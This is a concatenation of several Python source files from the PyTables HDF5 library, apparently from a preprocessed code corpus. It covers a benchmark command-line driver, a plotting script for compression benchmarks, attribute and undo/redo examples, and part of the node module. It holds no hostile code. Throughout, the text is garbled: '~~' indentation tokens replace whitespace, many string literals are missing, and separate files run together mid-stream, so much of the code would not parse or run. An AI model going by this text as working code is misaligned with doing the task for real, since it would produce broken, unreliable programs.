# Necessary to make the benchmark to run correctly. \n 
self . close_db ( self . con ) \n 
self . con = self . open_db ( ) \n 
# Finally, close the file. \n 
~~ ~~ self . close_db ( self . con ) \n 
\n 
~~ def close_db ( self , con ) : \n 
~~~ con . close ( ) \n 
\n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ import sys \n 
import getopt \n 
\n 
try : \n 
~~~ import psyco \n 
psyco_imported = 1 \n 
~~ except : \n 
~~~ psyco_imported = 0 \n 
\n 
~~ usage = """usage: %s [-T] [-P] [-v] [-f] [-k] [-p] [-m] [-c] [-q] [-i] [-I] [-S] [-x] [-z complevel] [-l complib] [-R range] [-N niter] [-n nrows] [-d datadir] [-O level] [-t kind] [-s] col -Q [suplim]\n            -T use Pytables\n            -P use Postgres\n            -v verbose\n            -f do a profile of the run (only query functionality & Python 2.5)\n            -k do a profile for kcachegrind use (out file is \'indexed_search.kcg\')\n            -p use "psyco" if available\n            -m use random values to fill the table\n            -q do a query (both indexed and non-indexed versions)\n            -i do a query (just indexed one)\n            -I do a query (just in-kernel one)\n            -S do a query (just standard one)\n            -x choose a different seed for random numbers (i.e. avoid FS cache)\n            -c create the database\n            -z compress with zlib (no compression by default)\n            -l use complib for compression (zlib used by default)\n            -R select a range in a field in the form "start,stop" (def "0,10")\n            -N number of iterations for reading\n            -n sets the number of rows (in krows) in each table\n            -d directory to save data (default: data.nobackup)\n            -O set the optimization level for PyTables indexes\n            -t select the index type: "medium" (default) or "full", "light", "ultralight"\n            -s select a type column for operations (\'int\' or \'float\'. def all)\n            -Q do a repeteated query up to 10**value\n            \\n""" % sys . argv [ 0 ] \n 
\n 
try : \n 
~~~ opts , pargs = getopt . getopt ( \n 
sys . argv [ 1 : ] , ) \n 
~~ except : \n 
~~~ sys . stderr . write ( usage ) \n 
sys . exit ( 1 ) \n 
\n 
# default options \n 
~~ usepytables = 0 \n 
usepostgres = 0 \n 
verbose = 0 \n 
doprofile = 0 \n 
dokprofile = 0 \n 
usepsyco = 0 \n 
userandom = 0 \n 
docreate = 0 \n 
optlevel = 0 \n 
kind = "medium" \n 
docompress = 0 \n 
complib = "zlib" \n 
doquery = False \n 
onlyidxquery = False \n 
onlynonidxquery = False \n 
inkernel = True \n 
avoidfscache = 0 \n 
#rng = [-10, 10] \n 
rng = [ - 1000 , - 1000 ] \n 
repeatquery = 0 \n 
repeatvalue = 0 \n 
krows = \n 
niter = READ_TIMES \n 
dtype = "all" \n 
datadir = "data.nobackup" \n 
\n 
# Get the options \n 
for option in opts : \n 
~~~ if option [ 0 ] == : \n 
~~~ usepytables = 1 \n 
~~ elif option [ 0 ] == : \n 
~~~ usepostgres = 1 \n 
~~ elif option [ 0 ] == : \n 
~~~ verbose = 1 \n 
~~ elif option [ 0 ] == : \n 
~~~ doprofile = 1 \n 
~~ elif option [ 0 ] == : \n 
~~~ dokprofile = 1 \n 
~~ elif option [ 0 ] == : \n 
~~~ usepsyco = 1 \n 
~~ elif option [ 0 ] == : \n 
~~~ userandom = 1 \n 
~~ elif option [ 0 ] == : \n 
~~~ docreate = 1 \n 
~~ elif option [ 0 ] == : \n 
~~~ doquery = True \n 
~~ elif option [ 0 ] == : \n 
~~~ doquery = True \n 
onlyidxquery = True \n 
~~ elif option [ 0 ] == : \n 
~~~ doquery = True \n 
onlynonidxquery = True \n 
~~ elif option [ 0 ] == : \n 
~~~ doquery = True \n 
onlynonidxquery = True \n 
inkernel = False \n 
~~ elif option [ 0 ] == : \n 
~~~ avoidfscache = 1 \n 
~~ elif option [ 0 ] == : \n 
~~~ docompress = int ( option [ 1 ] ) \n 
~~ elif option [ 0 ] == : \n 
~~~ complib = option [ 1 ] \n 
~~ elif option [ 0 ] == : \n 
~~~ rng = [ int ( i ) for i in option [ 1 ] . split ( "," ) ] \n 
~~ elif option [ 0 ] == : \n 
~~~ niter = int ( option [ 1 ] ) \n 
~~ elif option [ 0 ] == : \n 
~~~ krows = option [ 1 ] \n 
~~ elif option [ 0 ] == : \n 
~~~ datadir = option [ 1 ] \n 
~~ elif option [ 0 ] == : \n 
~~~ optlevel = int ( option [ 1 ] ) \n 
~~ elif option [ 0 ] == : \n 
~~~ if option [ 1 ] in ( , , , ) : \n 
~~~ kind = option [ 1 ] \n 
~~ else : \n 
~~~ print ( "kind should be either \'full\', \'medium\', \'light\' or " \n 
"\'ultralight\'" ) \n 
sys . exit ( 1 ) \n 
~~ ~~ elif option [ 0 ] == : \n 
~~~ if option [ 1 ] in ( , ) : \n 
~~~ dtype = option [ 1 ] \n 
~~ else : \n 
~~~ print ( "column should be either \'int\' or \'float\'" ) \n 
sys . exit ( 1 ) \n 
~~ ~~ elif option [ 0 ] == : \n 
~~~ repeatquery = 1 \n 
repeatvalue = int ( option [ 1 ] ) \n 
\n 
# If not database backend selected, abort \n 
~~ ~~ if not usepytables and not usepostgres : \n 
~~~ print ( "Please select a backend:" ) \n 
print ( "PyTables: -T" ) \n 
print ( "Postgres: -P" ) \n 
sys . exit ( 1 ) \n 
\n 
# Create the class for the database \n 
~~ if usepytables : \n 
~~~ from pytables_backend import PyTables_DB \n 
db = PyTables_DB ( krows , rng , userandom , datadir , \n 
docompress , complib , kind , optlevel ) \n 
~~ elif usepostgres : \n 
~~~ from postgres_backend import Postgres_DB \n 
db = Postgres_DB ( krows , rng , userandom ) \n 
\n 
~~ if not avoidfscache : \n 
# in order to always generate the same random sequence \n 
~~~ numpy . random . seed ( 20 ) \n 
\n 
~~ if verbose : \n 
~~~ if userandom : \n 
~~~ print ( "using random values" ) \n 
~~ if onlyidxquery : \n 
~~~ print ( "doing indexed queries only" ) \n 
\n 
~~ ~~ if psyco_imported and usepsyco : \n 
~~~ psyco . bind ( db . create_db ) \n 
psyco . bind ( db . query_db ) \n 
\n 
~~ if docreate : \n 
~~~ if verbose : \n 
~~~ print ( "writing %s rows" % krows ) \n 
~~ db . create_db ( dtype , kind , optlevel , verbose ) \n 
\n 
~~ if doquery : \n 
~~~ print ( "Calling query_db() %s times" % niter ) \n 
if doprofile : \n 
~~~ import pstats \n 
import cProfile as prof \n 
prof . run ( \n 
\n 
, \n 
) \n 
stats = pstats . Stats ( ) \n 
stats . strip_dirs ( ) \n 
stats . sort_stats ( , ) \n 
if verbose : \n 
~~~ stats . print_stats ( ) \n 
~~ else : \n 
~~~ stats . print_stats ( 20 ) \n 
~~ ~~ elif dokprofile : \n 
~~~ from cProfile import Profile \n 
import lsprofcalltree \n 
prof = Profile ( ) \n 
prof . run ( \n 
\n 
) \n 
kcg = lsprofcalltree . KCacheGrind ( prof ) \n 
ofile = open ( , ) \n 
kcg . output ( ofile ) \n 
ofile . close ( ) \n 
~~ elif doprofile : \n 
~~~ import hotshot \n 
import hotshot . stats \n 
prof = hotshot . Profile ( "indexed_search.prof" ) \n 
benchtime , stones = prof . run ( \n 
\n 
) \n 
prof . close ( ) \n 
stats = hotshot . stats . load ( "indexed_search.prof" ) \n 
stats . strip_dirs ( ) \n 
stats . sort_stats ( , ) \n 
stats . print_stats ( 20 ) \n 
~~ else : \n 
~~~ db . query_db ( niter , dtype , onlyidxquery , onlynonidxquery , \n 
avoidfscache , verbose , inkernel ) \n 
\n 
~~ ~~ if repeatquery : \n 
# Start by a range which is almost None \n 
~~~ db . rng = [ 1 , 1 ] \n 
if verbose : \n 
~~~ print ( "range:" , db . rng ) \n 
~~ db . query_db ( niter , dtype , onlyidxquery , onlynonidxquery , \n 
avoidfscache , verbose , inkernel ) \n 
for i in range ( repeatvalue ) : \n 
~~~ for j in ( 1 , 2 , 5 ) : \n 
~~~ rng = j * 10 ** i \n 
db . rng = [ - rng / 2 , rng / 2 ] \n 
if verbose : \n 
~~~ print ( "range:" , db . rng ) \n 
#                 if usepostgres: \n 
#                     os.system( \n 
#                         "echo 1 > /proc/sys/vm/drop_caches;" \n 
#                         " /etc/init.d/postgresql restart") \n 
#                 else: \n 
#                     os.system("echo 1 > /proc/sys/vm/drop_caches") \n 
~~ db . query_db ( niter , dtype , onlyidxquery , onlynonidxquery , \n 
avoidfscache , verbose , inkernel ) \n 
~~ ~~ ~~ ~~ """Script for plotting the results of the \'suite\' benchmark.\nInvoke without parameters for usage hints.\n\n:Author: Francesc Alted\n:Date: 2010-06-01\n""" \n 
\n 
import matplotlib as mpl \n 
from pylab import * \n 
\n 
KB_ = 1024 \n 
MB_ = 1024 * KB_ \n 
GB_ = 1024 * MB_ \n 
NCHUNKS = 128 # keep in sync with bench.c \n 
\n 
linewidth = 2 \n 
\n 
\n 
markers = [ , , , , , , , , , ] \n 
markersize = 8 \n 
\n 
def get_values ( filename ) : \n 
~~~ f = open ( filename ) \n 
values = { "memcpyw" : [ ] , "memcpyr" : [ ] } \n 
\n 
for line in f : \n 
~~~ if line . startswith ( ) : \n 
~~~ tmp = line . split ( ) [ 1 ] \n 
nthreads , size , elsize , sbits , codec , shuffle = [ i for i in tmp . split ( ) ] \n 
nthreads , size , elsize , sbits = map ( int , ( nthreads , size , elsize , sbits ) ) \n 
values [ "size" ] = size * NCHUNKS / MB_ ; \n 
values [ "elsize" ] = elsize ; \n 
values [ "sbits" ] = sbits ; \n 
values [ "codec" ] = codec \n 
values [ "shuffle" ] = shuffle \n 
# New run for nthreads \n 
( ratios , speedsw , speedsr ) = ( [ ] , [ ] , [ ] ) \n 
# Add a new entry for (ratios, speedw, speedr) \n 
values [ nthreads ] = ( ratios , speedsw , speedsr ) \n 
#print "-->", nthreads, size, elsize, sbits \n 
~~ elif line . startswith ( ) : \n 
~~~ tmp = line . split ( ) [ 1 ] \n 
memcpyw = float ( tmp . split ( ) [ 1 ] ) \n 
values [ "memcpyw" ] . append ( memcpyw ) \n 
~~ elif line . startswith ( ) : \n 
~~~ tmp = line . split ( ) [ 1 ] \n 
memcpyr = float ( tmp . split ( ) [ 1 ] ) \n 
values [ "memcpyr" ] . append ( memcpyr ) \n 
~~ elif line . startswith ( ) : \n 
~~~ tmp = line . split ( ) [ 1 ] \n 
speedw = float ( tmp . split ( ) [ 1 ] ) \n 
ratio = float ( line . split ( ) [ - 1 ] ) \n 
speedsw . append ( speedw ) \n 
ratios . append ( ratio ) \n 
~~ elif line . startswith ( ) : \n 
~~~ tmp = line . split ( ) [ 1 ] \n 
speedr = float ( tmp . split ( ) [ 1 ] ) \n 
speedsr . append ( speedr ) \n 
if "OK" not in line : \n 
~~~ print "WARNING!  OK not found in decomp line!" \n 
\n 
~~ ~~ ~~ f . close ( ) \n 
return nthreads , values \n 
\n 
\n 
~~ def show_plot ( plots , yaxis , legends , gtitle , xmax = None ) : \n 
~~~ xlabel ( ) \n 
ylabel ( ) \n 
title ( gtitle ) \n 
xlim ( 0 , xmax ) \n 
#ylim(0, 10000) \n 
ylim ( 0 , None ) \n 
grid ( True ) \n 
\n 
\n 
\n 
#legend([p[0] for p in plots], legends, loc = "upper left") \n 
legend ( [ p [ 0 ] for p in plots \n 
if not isinstance ( p , mpl . lines . Line2D ) ] , \n 
legends , loc = "best" ) \n 
\n 
\n 
#subplots_adjust(bottom=0.2, top=None, wspace=0.2, hspace=0.2) \n 
if outfile : \n 
~~~ print "Saving plot to:" , outfile \n 
savefig ( outfile , dpi = 64 ) \n 
~~ else : \n 
~~~ show ( ) \n 
\n 
~~ ~~ if __name__ == : \n 
\n 
~~~ from optparse import OptionParser \n 
\n 
usage = "usage: %prog [-r] [-o outfile] [-t title ] [-d|-c] filename" \n 
compress_title = \n 
decompress_title = \n 
yaxis = \n 
\n 
parser = OptionParser ( usage = usage ) \n 
parser . add_option ( , \n 
, \n 
dest = , \n 
help = ( \n 
) ) \n 
\n 
parser . add_option ( , \n 
, \n 
dest = , \n 
help = , ) \n 
\n 
parser . add_option ( , \n 
, \n 
dest = , \n 
help = , ) \n 
\n 
parser . add_option ( , \n 
, \n 
dest = , \n 
help = , \n 
default = None ) \n 
\n 
parser . add_option ( , , action = , \n 
dest = , \n 
help = , \n 
default = False ) \n 
\n 
parser . add_option ( , , action = , \n 
dest = , \n 
help = , \n 
default = False ) \n 
parser . add_option ( , , action = , \n 
dest = , \n 
help = , \n 
default = False ) \n 
\n 
( options , args ) = parser . parse_args ( ) \n 
if len ( args ) == 0 : \n 
~~~ parser . error ( "No input arguments" ) \n 
~~ elif len ( args ) > 1 : \n 
~~~ parser . error ( "Too many input arguments" ) \n 
~~ else : \n 
~~~ pass \n 
\n 
~~ if options . report and options . outfile : \n 
~~~ parser . error ( "Can only select one of [-r, -o]" ) \n 
\n 
~~ if options . dspeed and options . cspeed : \n 
~~~ parser . error ( "Can only select one of [-d, -c]" ) \n 
~~ elif options . cspeed : \n 
~~~ options . dspeed = False \n 
plot_title = compress_title \n 
~~ else : # either neither or dspeed \n 
~~~ options . dspeed = True \n 
plot_title = decompress_title \n 
\n 
~~ filename = args [ 0 ] \n 
cspeed = options . cspeed \n 
dspeed = options . dspeed \n 
if options . outfile : \n 
~~~ outfile = options . outfile \n 
~~ elif options . report : \n 
~~~ if cspeed : \n 
~~~ outfile = filename [ : filename . rindex ( ) ] + \n 
~~ else : \n 
~~~ outfile = filename [ : filename . rindex ( ) ] + \n 
~~ ~~ else : \n 
~~~ outfile = None \n 
\n 
~~ plots = [ ] \n 
legends = [ ] \n 
nthreads , values = get_values ( filename ) \n 
#print "Values:", values \n 
\n 
if options . limit : \n 
~~~ thread_range = eval ( options . limit ) \n 
~~ else : \n 
~~~ thread_range = range ( 1 , nthreads + 1 ) \n 
\n 
~~ if options . title : \n 
~~~ plot_title = options . title \n 
~~ else : \n 
~~~ plot_title += " (%(size).1f MB, %(elsize)d bytes, %(sbits)d bits), %(codec)s %(shuffle)s" % \n 
~~ gtitle = plot_title \n 
\n 
for nt in thread_range : \n 
#print "Values for %s threads --> %s" % (nt, values[nt]) \n 
~~~ ( ratios , speedw , speedr ) = values [ nt ] \n 
if cspeed : \n 
~~~ speed = speedw \n 
~~ else : \n 
~~~ speed = speedr \n 
#plot_ = semilogx(ratios, speed, linewidth=2) \n 
~~ plot_ = plot ( ratios , speed , linewidth = 2 ) \n 
plots . append ( plot_ ) \n 
nmarker = nt \n 
if nt >= len ( markers ) : \n 
~~~ nmarker = nt % len ( markers ) \n 
~~ setp ( plot_ , marker = markers [ nmarker ] , markersize = markersize , \n 
linewidth = linewidth ) \n 
legends . append ( "%d threads" % nt ) \n 
\n 
# Add memcpy lines \n 
~~ if cspeed : \n 
~~~ mean = np . mean ( values [ "memcpyw" ] ) \n 
message = "memcpy (write to memory)" \n 
~~ else : \n 
~~~ mean = np . mean ( values [ "memcpyr" ] ) \n 
message = "memcpy (read from memory)" \n 
~~ plot_ = axhline ( mean , linewidth = 3 , linestyle = , color = ) \n 
text ( 1.0 , mean + 50 , message ) \n 
plots . append ( plot_ ) \n 
show_plot ( plots , yaxis , legends , gtitle , xmax = int ( options . xmax ) if \n 
options . xmax else None ) \n 
\n 
\n 
~~ import numpy as np \n 
import tables \n 
\n 
# Open a new empty HDF5 file \n 
fileh = tables . open_file ( "attributes1.h5" , mode = "w" , \n 
title = "Testing attributes" ) \n 
# Get the root group \n 
root = fileh . root \n 
\n 
# Create an array \n 
a = np . array ( [ 1 , 2 , 4 ] , np . int32 ) \n 
# Save it on the HDF5 file \n 
hdfarray = fileh . create_array ( root , , a , "Integer array" ) \n 
\n 
# Assign user attributes \n 
\n 
# A string \n 
hdfarray . attrs . string = "This is an example" \n 
\n 
# A Char \n 
hdfarray . attrs . char = "1" \n 
\n 
# An integer \n 
hdfarray . attrs . int = 12 \n 
\n 
# A float \n 
hdfarray . attrs . float = 12.32 \n 
\n 
# A generic object \n 
hdfarray . attrs . object = { "a" : 32.1 , "b" : 1 , "c" : [ 1 , 2 ] } \n 
\n 
# Close the file \n 
fileh . close ( ) \n 
"""Yet another couple of examples on do/undo feauture.""" \n 
\n 
import tables \n 
\n 
\n 
def setUp ( filename ) : \n 
# Create an HDF5 file \n 
~~~ fileh = tables . open_file ( filename , mode = "w" , title = "Undo/Redo demo" ) \n 
# Create some nodes in there \n 
fileh . create_group ( "/" , "agroup" , "Group 1" ) \n 
fileh . create_group ( "/agroup" , "agroup2" , "Group 2" ) \n 
fileh . create_array ( "/" , "anarray" , [ 1 , 2 ] , "Array 1" ) \n 
# Enable undo/redo. \n 
fileh . enable_undo ( ) \n 
return fileh \n 
\n 
\n 
~~ def tearDown ( fileh ) : \n 
# Disable undo/redo. \n 
~~~ fileh . disable_undo ( ) \n 
# Close the file \n 
fileh . close ( ) \n 
\n 
\n 
~~ def demo_6times3marks ( ) : \n 
~~~ """Checking with six ops and three marks.""" \n 
\n 
# Initialize the data base with some nodes \n 
fileh = setUp ( "undo-redo-6times3marks.h5" ) \n 
\n 
# Create a new array \n 
fileh . create_array ( , , [ 3 , 4 ] , "Another array 1" ) \n 
fileh . create_array ( , , [ 4 , 5 ] , "Another array 2" ) \n 
# Put a mark \n 
fileh . mark ( ) \n 
fileh . create_array ( , , [ 5 , 6 ] , "Another array 3" ) \n 
fileh . create_array ( , , [ 6 , 7 ] , "Another array 4" ) \n 
# Put a mark \n 
fileh . mark ( ) \n 
fileh . create_array ( , , [ 7 , 8 ] , "Another array 5" ) \n 
fileh . create_array ( , , [ 8 , 9 ] , "Another array 6" ) \n 
# Unwind just one mark \n 
fileh . undo ( ) \n 
assert "/otherarray1" in fileh \n 
assert "/otherarray2" in fileh \n 
assert "/otherarray3" in fileh \n 
assert "/otherarray4" in fileh \n 
assert "/otherarray5" not in fileh \n 
assert "/otherarray6" not in fileh \n 
# Unwind another mark \n 
fileh . undo ( ) \n 
assert "/otherarray1" in fileh \n 
assert "/otherarray2" in fileh \n 
assert "/otherarray3" not in fileh \n 
assert "/otherarray4" not in fileh \n 
assert "/otherarray5" not in fileh \n 
assert "/otherarray6" not in fileh \n 
# Unwind all marks \n 
fileh . undo ( ) \n 
assert "/otherarray1" not in fileh \n 
assert "/otherarray2" not in fileh \n 
assert "/otherarray3" not in fileh \n 
assert "/otherarray4" not in fileh \n 
assert "/otherarray5" not in fileh \n 
assert "/otherarray6" not in fileh \n 
# Redo until the next mark \n 
fileh . redo ( ) \n 
assert "/otherarray1" in fileh \n 
assert "/otherarray2" in fileh \n 
assert "/otherarray3" not in fileh \n 
assert "/otherarray4" not in fileh \n 
assert "/otherarray5" not in fileh \n 
assert "/otherarray6" not in fileh \n 
# Redo until the next mark \n 
fileh . redo ( ) \n 
assert "/otherarray1" in fileh \n 
assert "/otherarray2" in fileh \n 
assert "/otherarray3" in fileh \n 
assert "/otherarray4" in fileh \n 
assert "/otherarray5" not in fileh \n 
assert "/otherarray6" not in fileh \n 
# Redo until the end \n 
fileh . redo ( ) \n 
assert "/otherarray1" in fileh \n 
assert "/otherarray2" in fileh \n 
assert "/otherarray3" in fileh \n 
assert "/otherarray4" in fileh \n 
assert "/otherarray5" in fileh \n 
assert "/otherarray6" in fileh \n 
\n 
# Tear down the file \n 
tearDown ( fileh ) \n 
\n 
\n 
~~ def demo_manyops ( ) : \n 
~~~ """Checking many operations together.""" \n 
\n 
# Initialize the data base with some nodes \n 
fileh = setUp ( "undo-redo-manyops.h5" ) \n 
\n 
# Create an array \n 
fileh . create_array ( fileh . root , , [ 3 ] , "Array title 3" ) \n 
# Create a group \n 
fileh . create_group ( fileh . root , , "Group title 3" ) \n 
# /anarray => /agroup/agroup3/ \n 
new_node = fileh . copy_node ( , ) \n 
new_node = fileh . copy_children ( , , recursive = 1 ) \n 
# rename anarray \n 
fileh . rename_node ( , ) \n 
# Move anarray \n 
new_node = fileh . copy_node ( , ) \n 
# Remove anarray4 \n 
fileh . remove_node ( ) \n 
# Undo the actions \n 
fileh . undo ( ) \n 
assert not in fileh \n 
assert not in fileh \n 
assert not in fileh \n 
assert not in fileh \n 
assert not in fileh \n 
assert in fileh \n 
\n 
# Redo the actions \n 
fileh . redo ( ) \n 
# Check that the copied node exists again in the object tree. \n 
assert in fileh \n 
assert in fileh \n 
assert in fileh \n 
assert not in fileh \n 
assert fileh . root . agroup . anarray3 is new_node \n 
assert not in fileh \n 
assert not in fileh \n 
\n 
# Tear down the file \n 
tearDown ( fileh ) \n 
\n 
\n 
~~ if __name__ == : \n 
\n 
# run demos \n 
~~~ demo_6times3marks ( ) \n 
demo_manyops ( ) \n 
# -*- coding: utf-8 -*- \n 
\n 
######################################################################## \n 
# \n 
# License: BSD \n 
# Created: 2005-02-11 \n 
# Author: Ivan Vilata i Balaguer - ivan@selidor.net \n 
# \n 
# $Id$ \n 
# \n 
######################################################################## \n 
\n 
~~ """PyTables nodes.""" \n 
from __future__ import absolute_import \n 
\n 
import warnings \n 
import functools \n 
\n 
from . registry import class_name_dict , class_id_dict \n 
from . exceptions import ( ClosedNodeError , NodeError , UndoRedoWarning , \n 
PerformanceWarning ) \n 
from . path import join_path , split_path , isvisiblepath \n 
from . utils import lazyattr \n 
from . undoredo import move_to_shadow \n 
from . attributeset import AttributeSet , NotLoggedAttributeSet \n 
import six \n 
\n 
\n 
__docformat__ = \n 
"""The format of documentation strings in this module.""" \n 
\n 
\n 
def _closedrepr ( oldmethod ) : \n 
~~~ """Decorate string representation method to handle closed nodes.\n\n    If the node is closed, a string like this is returned::\n\n      <closed MODULE.CLASS at ADDRESS>\n\n    instead of calling `oldmethod` and returning its result.\n\n    """ \n 
\n 
@ functools . wraps ( oldmethod ) \n 
def newmethod ( self ) : \n 
~~~ if not self . _v_isopen : \n 
~~~ cmod = self . __class__ . __module__ \n 
cname = self . __class__ . __name__ \n 
addr = hex ( id ( self ) ) \n 
return % ( cmod , cname , addr ) \n 
~~ return oldmethod ( self ) \n 
\n 
~~ return newmethod \n 
\n 
\n 
~~ class MetaNode ( type ) : \n 
~~~ """Node metaclass.\n\n    This metaclass ensures that their instance classes get registered\n    into several dictionaries (namely the `tables.utils.class_name_dict`\n    class name dictionary and the `tables.utils.class_id_dict` class\n    identifier dictionary).\n\n    It also adds sanity checks to some methods:\n\n      * Check that the node is open when calling string representation\n        and provide a default string if so.\n\n    """ \n 
\n 
def __new__ ( class_ , name , bases , dict_ ) : \n 
# Add default behaviour for representing closed nodes. \n 
~~~ for mname in [ , ] : \n 
~~~ if mname in dict_ : \n 
~~~ dict_ [ mname ] = _closedrepr ( dict_ [ mname ] ) \n 
\n 
~~ ~~ return type . __new__ ( class_ , name , bases , dict_ ) \n 
\n 
~~ def __init__ ( class_ , name , bases , dict_ ) : \n 
~~~ super ( MetaNode , class_ ) . __init__ ( name , bases , dict_ ) \n 
\n 
# Always register into class name dictionary. \n 
class_name_dict [ class_ . __name__ ] = class_ \n 
\n 
# Register into class identifier dictionary only if the class \n 
\n 
cid = getattr ( class_ , , None ) \n 
if cid is not None : \n 
~~~ for base in bases : \n 
~~~ pcid = getattr ( base , , None ) \n 
if pcid == cid : \n 
~~~ break \n 
~~ ~~ else : \n 
~~~ class_id_dict [ cid ] = class_ \n 
\n 
\n 
~~ ~~ ~~ ~~ class Node ( six . with_metaclass ( MetaNode , object ) ) : \n 
~~~ """Abstract base class for all PyTables nodes.\n\n    This is the base class for *all* nodes in a PyTables hierarchy. It is an\n    abstract class, i.e. it may not be directly instantiated; however, every\n    node in the hierarchy is an instance of this class.\n\n    A PyTables node is always hosted in a PyTables *file*, under a *parent\n    group*, at a certain *depth* in the node hierarchy. A node knows its own\n    *name* in the parent group and its own *path name* in the file.\n\n    All the previous information is location-dependent, i.e. it may change when\n    moving or renaming a node in the hierarchy. A node also has\n    location-independent information, such as its *HDF5 object identifier* and\n    its *attribute set*.\n\n    This class gathers the operations and attributes (both location-dependent\n    and independent) which are common to all PyTables nodes, whatever their\n    type is. Nonetheless, due to natural naming restrictions, the names of all\n    of these members start with a reserved prefix (see the Group class\n    in :ref:`GroupClassDescr`).\n\n    Sub-classes with no children (e.g. *leaf nodes*) may define new methods,\n    attributes and properties to avoid natural naming restrictions. For\n    instance, _v_attrs may be shortened to attrs and _f_rename to\n    rename. However, the original methods and attributes should still be\n    available.\n\n    .. rubric:: Node attributes\n\n    .. attribute:: _v_depth\n\n        The depth of this node in the tree (an non-negative integer value).\n\n    .. attribute:: _v_file\n\n        The hosting File instance (see :ref:`FileClassDescr`).\n\n    .. attribute:: _v_name\n\n        The name of this node in its parent group (a string).\n\n    .. attribute:: _v_pathname\n\n        The path of this node in the tree (a string).\n\n    .. attribute:: _v_objectid\n\n        A node identifier (may change from run to run).\n\n        .. versionchanged:: 3.0\n           The *_v_objectID* attribute has been renamed into *_v_object_id*.\n\n    """ \n 
\n 
# By default, attributes accept Undo/Redo. \n 
_AttributeSet = AttributeSet \n 
\n 
# `_v_parent` is accessed via its file to avoid upwards references. \n 
def _g_getparent ( self ) : \n 
~~~ "The parent :class:`Group` instance" \n 
( parentpath , nodename ) = split_path ( self . _v_pathname ) \n 
return self . _v_file . _get_node ( parentpath ) \n 
\n 
~~ _v_parent = property ( _g_getparent ) \n 
\n 
\n 
# This saves 0.7s/3.8s. \n 
@ lazyattr \n 
def _v_attrs ( self ) : \n 
~~~ """The associated `AttributeSet` instance.\n\n        See Also\n        --------\n        tables.attributeset.AttributeSet : container for the HDF5 attributes\n\n        """ \n 
\n 
return self . _AttributeSet ( self ) \n 
\n 
\n 
# with the empty string as a default value. \n 
~~ def _g_gettitle ( self ) : \n 
~~~ "A description of this node. A shorthand for TITLE attribute." \n 
if hasattr ( self . _v_attrs , ) : \n 
~~~ return self . _v_attrs . TITLE \n 
~~ else : \n 
~~~ return \n 
\n 
~~ ~~ def _g_settitle ( self , title ) : \n 
~~~ self . _v_attrs . TITLE = title \n 
\n 
~~ _v_title = property ( _g_gettitle , _g_settitle ) \n 
\n 
\n 
# to be called.  See ticket #144 for more info. \n 
_v_isopen = False \n 
"""Whehter this node is open or not.""" \n 
\n 
\n 
# The ``_log`` argument is only meant to be used by ``_g_copy_as_child()`` \n 
# to avoid logging the creation of children nodes of a copied sub-tree. \n 
def __init__ ( self , parentnode , name , _log = True ) : \n 
# Remember to assign these values in the root group constructor \n 
# as it does not use this method implementation! \n 
\n 
# if the parent node is a softlink, dereference it \n 
~~~ if isinstance ( parentnode , class_name_dict [ ] ) : \n 
~~~ parentnode = parentnode . dereference ( ) \n 
\n 
~~ self . _v_file = None \n 
"""The hosting File instance (see :ref:`FileClassDescr`).""" \n 
\n 
self . _v_isopen = False \n 
"""Whether this node is open or not.""" \n 
\n 
self . _v_pathname = None \n 
"""The path of this node in the tree (a string).""" \n 
\n 
self . _v_name = None \n 
"""The name of this node in its parent group (a string).""" \n 
\n 
self . _v_depth = None \n 
"""The depth of this node in the tree (an non-negative integer value).\n        """ \n 
\n 
self . _v_maxtreedepth = parentnode . _v_file . params [ ] \n 
"""Maximum tree depth before warning the user.\n\n        .. versionchanged:: 3.0\n           Renamed into *_v_maxtreedepth* from *_v_maxTreeDepth*.\n\n        """ \n 
\n 
self . _v__deleting = False \n 
"""Is the node being deleted?""" \n 
\n 
self . _v_objectid = None \n 
"""A node identifier (may change from run to run).\n\n        .. versionchanged:: 3.0\n           The *_v_objectID* attribute has been renamed into *_v_objectid*.\n\n        """ \n 
\n 
validate = new = self . _v_new # set by subclass constructor \n 
\n 
# Is the parent node a group?  Is it open? \n 
self . _g_check_group ( parentnode ) \n 
parentnode . _g_check_open ( ) \n 
file_ = parentnode . _v_file \n 
\n 
# Will the file be able to host a new node? \n 
if new : \n 
~~~ file_ . _check_writable ( ) \n 
\n 
# Bind to the parent node and set location-dependent information. \n 
~~ if new : \n 
# Only new nodes need to be referenced. \n 
# Opened nodes are already known by their parent group. \n 
~~~ parentnode . _g_refnode ( self , name , validate ) \n 
~~ self . _g_set_location ( parentnode , name ) \n 
\n 
try : \n 
# hdf5extension operations: \n 
#   Update node attributes. \n 
~~~ self . _g_new ( parentnode , name , init = True ) \n 
#   Create or open the node and get its object ID. \n 
if new : \n 
~~~ self . _v_objectid = self . _g_create ( ) \n 
~~ else : \n 
~~~ self . _v_objectid = self . _g_open ( ) \n 
\n 
# The node *has* been created, log that. \n 
~~ if new and _log and file_ . is_undo_enabled ( ) : \n 
~~~ self . _g_log_create ( ) \n 
\n 
# This allows extra operations after creating the node. \n 
~~ self . _g_post_init_hook ( ) \n 
~~ except : \n 
# If anything happens, the node must be closed \n 
# to undo every possible registration made so far. \n 
# We do *not* rely on ``__del__()`` doing it later, \n 
# since it might never be called anyway. \n 
~~~ self . _f_close ( ) \n 
raise \n 
\n 
~~ ~~ def _g_log_create ( self ) : \n 
~~~ self . _v_file . _log ( , self . _v_pathname ) \n 
\n 
\n 
~~ def __del__ ( self ) : \n 
# Closed `Node` instances can not be killed and revived. \n 
# Instead, accessing a closed and deleted (from memory, not \n 
# disk) one yields a *new*, open `Node` instance.  This is \n 
# because of two reasons: \n 
# \n 
# 1. Predictability.  After closing a `Node` and deleting it, \n 
#    only one thing can happen when accessing it again: a new, \n 
#    open `Node` instance is returned.  If closed nodes could be \n 
#    revived, one could get either a closed or an open `Node`. \n 
# \n 
# 2. Ease of use.  If the user wants to access a closed node \n 
#    again, the only condition would be that no references to \n 
#    the `Node` instance were left.  If closed nodes could be \n 
#    revived, the user would also need to force the closed \n 
#    `Node` out of memory, which is not a trivial task. \n 
# \n 
\n 
~~~ if not self . _v_isopen : \n 
~~~ return # the node is already closed or not initialized \n 
\n 
~~ self . _v__deleting = True \n 
\n 
# If we get here, the `Node` is still open. \n 
try : \n 
~~~ node_manager = self . _v_file . _node_manager \n 
node_manager . drop_node ( self , check_unregistered = False ) \n 
~~ finally : \n 
# At this point the node can still be open if there is still some \n 
# alive reference around (e.g. if the __del__ method is called \n 
# explicitly by the user). \n 
~~~ if self . _v_isopen : \n 
~~~ self . _v__deleting = True \n 
self . _f_close ( ) \n 
\n 
~~ ~~ ~~ def _g_pre_kill_hook ( self ) : \n 
